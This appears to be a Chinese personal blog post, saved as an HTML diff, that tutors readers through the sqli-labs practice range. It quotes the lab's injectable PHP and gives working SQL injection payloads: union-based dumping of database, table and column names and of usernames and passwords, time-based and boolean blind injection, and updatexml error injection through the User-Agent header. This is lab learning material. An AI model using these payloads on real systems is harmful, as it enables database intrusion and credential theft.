@@ -1,0 +1,1523 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <!-- cungudafa百度收录验证编号 -->
+  <!-- <meta name="baidu-site-verification" content="LukfTcyXmC" /> -->
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">sqli-lab | s1rius&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/images/sakura.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cungudafa/cdn/css/style.css" type="text/css" media="all" id="saukra_css-css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cungudafa/cdn/css/jquery.fancybox.min.css" media="all">  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cungudafa/cdn/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cungudafa/cdn/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/cungudafa/cdn/css/tags.css" media="all">
+  
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/cungudafa/cdn/css/logo.css">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/cungudafa/cdn/fonts/LOGO/logo.css">
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+
+  <!-- 分析 -->
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <!-- Baidu Analytics -->
+
+<script>
+    var _hmt = _hmt || [];
+    (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?18343983";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+  
+  <!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+  " type="text/css" media="all"> -->
+  <script>
+    /*Initial Variables*/
+    var mashiro_option = new Object();
+    var mashiro_global = new Object();
+    mashiro_option.NProgressON = true;
+    /* 
+    * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+    * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+    */
+    mashiro_option.email_domain = "";
+    mashiro_option.email_name = "";
+    mashiro_option.cookie_version_control = "";
+    mashiro_option.qzone_autocomplete = false;
+    mashiro_option.site_name = "s1riuss1rius's blog";
+    mashiro_option.author_name = "s1rius's blog";
+    mashiro_option.site_url = "http://s1rius.github.io";
+    mashiro_option.v_appId = "";//
+    mashiro_option.v_appKey = "";//
+    mashiro_option.mathjax = "1";
+    mashiro_option.copyright_enable = "false" ;
+    mashiro_option.copyright_minCharNumber = parseInt("50") ;
+    mashiro_option.copyright_description = "本文章著作权归作者s1rius所有，任何形式的转载都请注明出处。" ;
+    mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+    mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+    // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+    // mashiro_option.float_player_on = true;
+
+    /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+    var bg = "https://api.maho.cc/random-img/pc.php".split(",");
+    var bgindex = Math.floor(Math.random()*bg.length);
+    if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+      alert('朋友，IE浏览器未适配哦~');
+    }
+  </script>
+</head> 
+</html>
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <!-- Dynamic sliders -->
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <!-- Main content -->
+  <section id="main-container">
+    <!-- Top menu -->
+    <div class="headertop ">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="http://s1rius.github.io">
+          <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/avatar.jpg">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>剑未配妥出门已是江湖，千帆过尽归来仍是少年。</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+            
+              
+                <li>
+                  <a href="http://github.com/cns1rius" target="_blank" class="social-github" title="github">
+                    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/social/github.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://blog.csdn.net/qq_62414126" target="_blank" class="social-github" title="csdn">
+                    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/social/csdn.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li class="wechat">
+                  <a href="/#">
+                    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/social/wechat.png">
+                  </a>
+                  <div class="wechatInner">
+                    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/cungudafa.png">
+                  </div>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=MjkxNjExNzQ3Mw==" target="_blank" class="social-github" title="qq">
+                    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/social/qq.png">
+                  </a>
+                </li>
+              
+            
+              
+                <li>
+                  <a href="https://space.bilibili.com/TkRNME1UTTFNREky" target="_blank" class="social-github" title="Bilibili">
+                    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/social/bilibili.png">
+                  </a>
+                </li>
+              
+            
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  
+  <div id="video-container">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <!-- banner -->
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+        <span class="site-title">
+            <span class="logolink logo">
+                <a href="/">
+                    <ruby>
+                    <span class="sakuraso">s1rius</span>
+                    <span class="no">的</span>
+                    <span class="shironeko">小破站</span>
+                    <rp></rp>
+                    <rt class="logo">s1rius</rt>
+                    <rp></rp>
+                    </ruby>
+                  </a>
+            </span>
+          </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+                    归档
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/analytics/">
+                          <i class="fa fa-line-chart" aria-hidden="true"></i>
+                          统计
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/tags">
+                          <i class="fa fa-tags" aria-hidden="true"></i>
+                          标签
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/ctf/">
+                          <i class="fa fa-code" aria-hidden="true"></i>
+                          ctf
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/生活/">
+                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
+                          生活
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    清单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/artitalk/">
+                          <i class="fa fa-commenting-o fa-commenting" aria-hidden="true"></i>
+                          说说
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/photos/">
+                          <i class="fa fa-photo" aria-hidden="true"></i>
+                          相册
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/books/">
+                          <i class="fa fa-book" aria-hidden="true"></i>
+                          悦读
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/movies/">
+                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                          追剧
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/comment/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
+                    留言板
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/links/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+                    友人帐
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/donate/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
+                    赞赏
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/about/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+                    关于
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/atom.xml">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
+                    RSS
+                  </span>
+                </a>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      
+      <!-- body -->
+      <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/cungudafa/cdn/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+<div class="pattern-center single-center">
+  <!-- 有配图默认渲染第一张 -->
+  <div class="pattern-attachment-img lazyload" style="background-image: url(https://gcore.jsdelivr.net/npm/ushio-api-img-moe@5.0.87/img_873_1920x1080_72_null_normal.jpg);"
+    src="https://cdn.jsdelivr.net/gh/cungudafa/cdn/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://gcore.jsdelivr.net/npm/ushio-api-img-moe@5.0.87/img_873_1920x1080_72_null_normal.jpg">
+  </div>
+  <header class="pattern-header single-header">
+    <h1 class="entry-title">sqli-lab</h1>
+    <p class="entry-census">
+      
+      <span class="post-meta-item">
+        <a href="cns1rius.github.io">
+          <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/avatar.jpg">
+        </a>
+      </span>
+      
+      
+      <span class="post-meta-item">
+        <a href="cns1rius.github.io"> s1rius </a>
+      </span>
+      <span class="bull">
+        ·</span>
+      
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="fa fa-calendar"></i>
+        </span>
+        <span class="post-meta-item-text"> 2022-8-29 </span>
+      </span>
+      <span class="bull">
+        ·</span>
+      <!-- 浏览数显示 -->
+      <span class="post-meta-item" >
+        <span class="post-meta-item-icon">
+          <i class="iconfont icon-attention"></i>
+        </span>
+        <span class="post-meta-item-text">本文共<span id="busuanzi_value_page_pv"> </span>次阅读
+        </span>
+      </span>
+      <span class="bull">
+        ·</span>
+      <!-- 字数统计-->
+      <span class="post-meta-item" >
+
+        
+      </span>
+      <span class="bull">
+        ·</span>
+      <!-- 评论数显示 -->
+      <!-- <span class="post-meta-item" >
+              <span class="post-meta-item-icon">
+                <i class="fa fa-comment-o"></i>
+              </span>
+              </span class="post-meta-item-text">
+                <span class="valine-comment-count" data-xid="/"> </span>
+              </span>
+          </span> -->
+    </p>
+  </header>
+</div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1"
+        class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content">  -->
+        <!--套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <p>sql注入就是<br>当用户输入一些本不是用户名密码的sql语句<br>这些语句没有被过滤<br>执行后通过回显等方式，使注入者获得了数据库的信息</p>
+<blockquote>
+<p>  水了几天用来搞visual studio2022和Windows11所以本文略微简陋写，以后会完善<br>  visual studio2022版美化教程见<a href="https://blog.csdn.net/qq_62414126/article/details/121863518" target="_blank" rel="noopener">Visual Studio 2022界面美化教程</a>.</p>
+</blockquote>
+<h1 id="GET传参"><a href="#GET传参" class="headerlink" title="GET传参"></a>GET传参</h1><p>先放代码</p>
+<pre><code class="php">&lt;?php
+//including the Mysql connect parameters.
+include(&quot;../sql-connections/sql-connect.php&quot;);
+error_reporting(0);
+// take the variables 
+if(isset($_GET[&#39;id&#39;]))
+{
+$id=$_GET[&#39;id&#39;];
+//logging the connection parameters to a file for analysis.
+$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
+fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
+fclose($fp);
+// connectivity 
+//注意get传参
+获取到输入的id后先打开一个result.txt然后把你上传的写入到那个文件里
+这样你再一次操作后你就可以看到你的注入语句真正注进去的是啥了
+$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+//上面一行中$id前后的符号是关键，是注入语句闭合的符号
+$result=mysql_query($sql);
+$row = mysql_fetch_array($result);
+
+    if($row)
+    {
+          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;//正确回显颜色为绿色
+          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
+          echo &quot;&lt;br&gt;&quot;;
+          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
+          echo &quot;&lt;/font&gt;&quot;;
+      }
+      //这是输入正确时的反馈，直接把运行结果告诉你
+    但是后几关就不一样了
+    else 
+    {
+        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;//报错回显为黄色
+        print_r(mysql_error());
+        echo &quot;&lt;/font&gt;&quot;;  
+    }
+    //这是输入错误时的反馈，把mysql_error反馈给你
+    同样，后几关也不一样了
+}
+    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
+//这是反馈你输入为空的
+
+?&gt;
+
+</code></pre>
+<p>==/<em> </em>我为了让读者能看得更清晰，我将注释符的右半部分删去，就像这句一样没有<em> </em>/（你细品这句话 悖论）==<br>我第一个注释是：注意get传参，前10关前半部分代码不变<br>第二个注释是提示读者要注意每一关的闭合方式（包裹方式）<br>在if后else前是正确回显部分 在else后是错误回显部分<br>这两部分是区分注入方式所需要关注的</p>
+<h2 id="先讲理论"><a href="#先讲理论" class="headerlink" title="==先讲理论=="></a>==先讲理论==</h2><p>根据两部分分别是否回显判断注入方式<br>注入方式包含联合查询、布尔盲注、时间盲注、报错注入等</p>
+<h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><p>最基础的就是?id=1’、username=admin’这类传参语句，后面的’引号是闭合方式上面有讲，他用的啥符号闭合，你就要用相同的符号来闭合你的语句，输入这类最基础的注入语句来判断是否有报错回显 回显是黄色，代码段注释里有写</p>
+<h3 id="判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数"><a href="#判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数" class="headerlink" title="判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数"></a>判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数</h3><pre><code class="sql">?id=1’ order by 1--+
+</code></pre>
+<p>这里的省略号只要不报错 就加大数字，直到报错的前一个数字，就是回显的行数</p>
+<h3 id="判断回显的数据是数据库中的哪几列"><a href="#判断回显的数据是数据库中的哪几列" class="headerlink" title="判断回显的数据是数据库中的哪几列"></a>判断回显的数据是数据库中的哪几列</h3><pre><code class="sql">?id=-1’ union select 1,2,3--+
+</code></pre>
+<p>这里的数字的最大值要等与上一步得到的那个数<br>上一步7报错，那行数就是6，这一步就要1，2，3，4，5，6–+<br>看看那几个数字出现在你屏幕上了<br>要注意要id=一个不正确的值 如0，-1之类 这样联合查询之后的返回值会让union之后的查询语句的结果在数组的第一列，而后台php代码只会回显第一列的数据</p>
+<h3 id="查库名"><a href="#查库名" class="headerlink" title="查库名"></a>查库名</h3><pre><code class="sql">?id=-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata --+
+</code></pre>
+<p>这里把查数据库的sql语句，替换掉出现在你屏幕上的一个数字 这里是3 来回显在屏幕上<br>group_concat(你要查询的数据）from 所在的库 表 列<br>这里查库名即查==schema_name== 这个数据被保存在==information_schema.schemata==<br>这样 回显的就是 数据库们 的名字</p>
+<h3 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h3><pre><code class="sql">?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’–+
+</code></pre>
+<p>table 表 information_schema.tables类比上面 table_schema=‘ 库名’<br>==这里你要猜一下==哪个数据库会放着你想要的数据，然后输在库名那个位置</p>
+<h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><pre><code class="sql">?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’--+
+</code></pre>
+<p>同样类比上面 column 列<br>==这里还要猜== 上面回显的哪个表里有你要的数据</p>
+<h3 id="提取数据"><a href="#提取数据" class="headerlink" title="提取数据"></a>提取数据</h3><p>==激动人心的时候到了==</p>
+<pre><code class="sql">?id=-1’ union select 1,2,group_concat(concat_ws(’~’,username,password)) from users–+
+</code></pre>
+<p>同样类比上面 有一处特殊concat_ws(符号，列名，列名）<br>中间那个符号会被concat_ws插入到两组数据之间，就是为了方便看<br>这样就查到数据了，是不是很简单。</p>
+<h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><p>limit是限制那一部分显示，limitx，y是从x+1开始显示y个</p>
+<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="正错回显都有"><a href="#正错回显都有" class="headerlink" title="正错回显都有"></a>正错回显都有</h3><p>就按上面的步骤一步一步找到数据<br>security———&gt;users——&gt;username&amp;password这就是靶场数据库的层次<br>图啥的以后再补</p>
+<h2 id="理论进阶"><a href="#理论进阶" class="headerlink" title="==理论进阶=="></a>==理论进阶==</h2><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><pre><code class="php">?id=1’ and sleep (5)–+
+?id=1‘ and if((left((select schema_name from information_schema.schemata limit 4,1),1,1)=‘s’),1,sleep(3))–+
+</code></pre>
+<p>这样的句子sleep()就是延时执行的意思，</p>
+<blockquote>
+<p>==让浏览器先睡一会==<br>当你想判断对不对的时候，你就让对的睡一会，错的继续肝，这样你就能看出来了</p>
+</blockquote>
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>下面几个方法各有优缺点<br>因为能知道sql-lab靶场数据库的数据<br>所以刷题时我多用left<br>实际</p>
+<h4 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h4><p>substr(a,b,c)将a字段从第b个字符读取c个字符</p>
+<h4 id="ascii"><a href="#ascii" class="headerlink" title="ascii"></a>ascii</h4><p>将括号中的字符转换为acsii码，再在最后进行值大小的判断，正确返回1，错误返回0</p>
+<blockquote>
+<p>类似于数学中的二分法</p>
+<h4 id="left"><a href="#left" class="headerlink" title="left"></a>left</h4><p>left(a)从第一位开始读取a个字符</p>
+</blockquote>
+<h4 id="模糊查询-like"><a href="#模糊查询-like" class="headerlink" title="模糊查询 like"></a>模糊查询 like</h4><p>a like ‘%b%’ 判断a字符串里是否有b<br>a like ‘b%’ 判断a开头是否有 <del>b数</del></p>
+<h4 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h4><p>regexp ‘a’正则表达式</p>
+<blockquote>
+<p>RegExp 对象表示正则表达式，它是对字符串执行模式匹配的强大工具 正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。<br>许多语言都有正则表达式<br>物理也有正则<br>所以正则是个啥(≧﹏ ≦)</p>
+</blockquote>
+<h2 id="实操进阶"><a href="#实操进阶" class="headerlink" title="实操进阶"></a>实操进阶</h2><h3 id="有报错回显-无正确回显"><a href="#有报错回显-无正确回显" class="headerlink" title="有报错回显 无正确回显"></a>有报错回显 无正确回显</h3><p>也就是说你在前四关能看见的绿字在5-8关用you are in替换了<br>也就是你之前查的库名 表名 列名 和数据不会回显了<br>当使用布尔盲注时 如果判断正确就会显示you are in<br>不正确的话就会报错<br>下图是第五关第一个用户名 最后一步注入语句<br>之前步骤参考第1到4关查各类信息的语句并用布尔盲注所用函数包装<img src="https://img-blog.csdnimg.cn/b430151e09e443ab9050d3d623a51bb0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="正确回显和报错回显都没有"><a href="#正确回显和报错回显都没有" class="headerlink" title="正确回显和报错回显都没有"></a>正确回显和报错回显都没有</h3><p>不论你输入啥，他都会说you are in</p>
+<blockquote>
+<p>就像你说 ==啊对对对==</p>
+</blockquote>
+<p>这样 布尔盲注也没法用了<br>你不知道注入语句是对是错<br>这时就要用时间盲注了<br>把布尔盲注再进行包装<br>if(布尔盲注语句,sleep(3),1)<br>正确的话，浏览器会延时3秒再运行<br><img src="https://img-blog.csdnimg.cn/c5682cd2fa574b16bbae457ffa20e388.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
+<h1 id="POST传参"><a href="#POST传参" class="headerlink" title="POST传参"></a>POST传参</h1><h2 id="先讲理论-1"><a href="#先讲理论-1" class="headerlink" title="==先讲理论=="></a>==先讲理论==</h2><pre><code class="php+HTML">&lt;!--Form to post the data for sql injections Error based SQL Injection--&gt;
+&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;
+    &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;
+        &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;
+    &lt;/div&gt;  
+    &lt;div&gt; Password  : &amp;nbsp;&amp;nbsp;&amp;nbsp;
+        &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;
+    &lt;/div&gt;&lt;/br&gt;
+    &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;
+        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+    &lt;/div&gt;
+&lt;/form&gt;
+        ==上面是前端 通过post传参uname和passwd==
+&lt;?php
+// take the variables
+if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))
+{
+    $uname=$_POST[&#39;uname&#39;];
+    $passwd=$_POST[&#39;passwd&#39;];
+/后端接收前端传的参数
+    //logging the connection parameters to a file for analysis.
+    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
+    fwrite($fp,&#39;User Name:&#39;.$uname);
+    fwrite($fp,&#39;Password:&#39;.$passwd.&quot;\n&quot;);
+    fclose($fp);
+// connectivity 
+    @$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;
+    $result=mysql_query($sql);
+    $row = mysql_fetch_array($result);
+
+    if($row)
+    {
+          //echo &#39;&lt;font color= &quot;#0000ff&quot;&gt;&#39;;    
+          echo &quot;&lt;br&gt;&quot;;
+        echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#39;;
+        //echo &quot; You Have successfully logged in\n\n &quot; ;
+        echo &#39;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#39;;    
+        echo &quot;&lt;br&gt;&quot;;
+        echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
+        echo &quot;&lt;br&gt;&quot;;
+        echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
+        echo &quot;&lt;br&gt;&quot;;
+        echo &quot;&lt;/font&gt;&quot;;
+        echo &quot;&lt;br&gt;&quot;;
+        echo &quot;&lt;br&gt;&quot;;
+        echo &#39;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#39;;    
+        /又是这里分成两部分，上面是正确回显
+        下面是报错回显
+        echo &quot;&lt;/font&gt;&quot;;
+      }
+    else  
+    {
+        echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;;
+        //echo &quot;Try again looser&quot;;
+        print_r(mysql_error());
+        echo &quot;&lt;/br&gt;&quot;;
+        echo &quot;&lt;/br&gt;&quot;;
+        echo &quot;&lt;/br&gt;&quot;;
+        echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;;    
+        echo &quot;&lt;/font&gt;&quot;;  
+    }
+}
+?&gt;
+</code></pre>
+<h3 id="post传参"><a href="#post传参" class="headerlink" title="==post传参=="></a>==post传参==</h3><p>post传参有很多方式最本质的就是在输入框传<br>然后是一些插件具有传参功能 hackbar 他们一般需要配合抓包的插件使用<br>较多的是一些抓包软件，burpsuit等<br>他们既有抓包功能，也有重发器，测试器功能强大</p>
+<h3 id="注入语句"><a href="#注入语句" class="headerlink" title="==注入语句=="></a>==注入语句==</h3><p>和get传参类型的语句大体相同，不同的地方有原来的id=1’由于get传参，抓包后自动写入uname/password=所以只需要写后面的admin’ 加上sql执行语句，原理一样，都是让系统执行完传参后继续把sql语句执行来回显  这里末尾注释符可用# </p>
+<h2 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h2><p>post传参同样有三大类</p>
+<h3 id="正误回显都有"><a href="#正误回显都有" class="headerlink" title="正误回显都有"></a>正误回显都有</h3><p>在burpsuit重发器里传参，<br><img src="https://img-blog.csdnimg.cn/4a405e6fb6bb451bb59e0111a93ebca6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>红字部分即为注入语句，这里同样只展示最后一步 其他可按照get传参原理<br>只需改动小部分</p>
+<h3 id="没正确回显-有报错回显"><a href="#没正确回显-有报错回显" class="headerlink" title="没正确回显 有报错回显"></a>没正确回显 有报错回显</h3><p><img src="https://img-blog.csdnimg.cn/facab42bd569421da49da39cac92470a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述">这里我采用了辨识度更高的时间盲注 布尔盲注同样使用</p>
+<h3 id="正错回显都没有"><a href="#正错回显都没有" class="headerlink" title="正错回显都没有"></a>正错回显都没有</h3><p>同上面直接时间盲注</p>
+<h1 id="基于报错注入的各种传参方式"><a href="#基于报错注入的各种传参方式" class="headerlink" title="基于报错注入的各种传参方式"></a>基于报错注入的各种传参方式</h1><h2 id="先讲报错注入"><a href="#先讲报错注入" class="headerlink" title="==先讲报错注入=="></a>==先讲报错注入==</h2><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><p>updatexml (XML_document, XPath_string, new_value)<br>替换查找到的符合条件的数据</p>
+<h3 id="extactvalue"><a href="#extactvalue" class="headerlink" title="extactvalue"></a>extactvalue</h3><p>extractvalue(XML_document, XPath_string)<br>对XML文档进行查询的函数<br>当上述两个函数的xpath路径出错时，将XML_document报错返回回来<br>注意只能返回32个字符，后面的可用limit 等来限制返回的字符位置</p>
+<h2 id="传参方式"><a href="#传参方式" class="headerlink" title="==传参方式=="></a>==传参方式==</h2><p>burp suite抓包后改相应数据</p>
+<h3 id="user-agent注入"><a href="#user-agent注入" class="headerlink" title="user-agent注入"></a>user-agent注入</h3><pre><code class="sql">User-Agent:&#39;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#39;
+</code></pre>
